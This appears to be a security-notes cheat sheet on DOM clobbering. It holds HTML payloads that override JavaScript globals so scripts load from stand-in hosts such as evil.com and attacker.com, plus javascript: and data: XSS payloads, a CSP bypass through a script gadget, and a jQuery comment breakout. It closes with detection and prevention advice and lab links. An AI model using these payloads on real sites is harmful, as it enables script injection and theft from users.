---
tags:
  - medium
  - client-side
---

# DOM Clobbering

## TL;DR

DOM Clobbering injects HTML with `id` or `name` attributes to **override JavaScript global variables**. Useful when HTML injection is possible but XSS is blocked (sanitizer, CSP).

**The pattern `window.x || {}` is vulnerable.**

## How It Works

### Vulnerable Pattern
```javascript
var config = window.config || {};
let script = document.createElement('script');
script.src = config.url;
document.body.appendChild(script);
```

### Attack
```html
<a id=config><a id=config name=url href=//evil.com/malware.js>
```

**Why it works:**
1. Two elements with same `id` → DOM groups them as **HTMLCollection**
2. `window.config` now points to this collection
3. `name=url` on second anchor clobbers `config.url`
4. Script loads from `evil.com`

## Techniques

### Basic: Double Anchor
```html
<a id=CONFIG><a id=CONFIG name=url href=//evil.com/payload.js>
```
→ `window.CONFIG.url` = `//evil.com/payload.js`

### Form + Input (Clobber attributes)
```html
<form onclick=alert(1)><input id=attributes>Click me
```
→ Bypasses filters that enumerate `element.attributes`

### Iframe Cross-Frame
```html
<iframe name=x srcdoc="<a id=y href=//evil.com>"></iframe>
```
→ `window.x.y` accessible cross-frame

### isDevelopment Bypass
```html
<img id=isDevelopment>
<!-- if (isDevelopment) → truthy because element exists -->
```

### toString Clobber
```html
<a id=x href="javascript:alert(1)">
<!-- x.toString() or x+'' → "javascript:alert(1)" -->
```

## Advanced: Node Flattening

Browser limits nesting to **512 levels**. Beyond that, elements flatten during serialization.

```html
<!-- 510 nested divs + clobber element -->
<div*510><table><tr><td><div id="chat-messages">
```

After innerHTML round-trip: element moves via **foster parenting**.

**Use case:** Clobber elements that must appear BEFORE the original in DOM.

## CSP Bypass

### Requirements
1. HTML injection
2. A **gadget** (clobberable JS property)
3. Allowed **sink** (script with nonce + strict-dynamic)

### Example
```html
<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>
```
→ Clobbers property that ends up in `script.src`

### With Query String Trick
```html
<a id=ehy><a id=ehy name=codeBasePath href="//attacker.com/xss.js?">
```
The `?` transforms original path into query string.

## Script Gadgets

DOM Clobbering often triggers **script gadgets** — legitimate JS that can be reused for arbitrary execution.

| Type | Description |
|------|-------------|
| String manipulation | Bypass pattern-based filters |
| Element construction | Create script elements |
| Function creation | `new Function(userInput)` |
| JS execution sink | `eval()`, `setTimeout()` |
| Expression parsers | Angular `{{...}}` |

### jQuery Mobile Gadget
```html
<div data-role=popup id='--!><script>alert("XSS")</script>'></div>
```
jQuery writes `id` in HTML comment → breakout with `--!>`.

## Detection

### Burp DOM Invader
1. Enable DOM Invader
2. Enable "DOM clobbering detection"
3. Reload page, check sinks

### Manual Code Review
```javascript
// Vulnerable patterns
window.x || {}
window.x || defaultValue
self.x || {}
globalThis.x || {}
document.x  // Named elements accessible via document
```

## Prevention

1. **Type check:** `obj instanceof NamedNodeMap`
2. **Avoid `window.x || {}`** — use explicit checks
3. **Use DOMPurify** with anti-clobbering options
4. **Namespace variables** — avoid globals
5. **Object.freeze()** on sensitive configs

## Real Examples

- **PortSwigger Labs:** CSP bypass via DOM clobbering
- **Intigriti XSS July 2024:** DOM Clobbering + base-uri abuse
- **Intigriti 1337UP 2024:** CSPT + DOM Clobbering chain

## Labs

- [PortSwigger DOM Clobbering Lab](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [PortSwigger CSP Bypass Lab](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)
- [Dom-Explorer Tool](https://yeswehack.github.io/Dom-Explorer/)
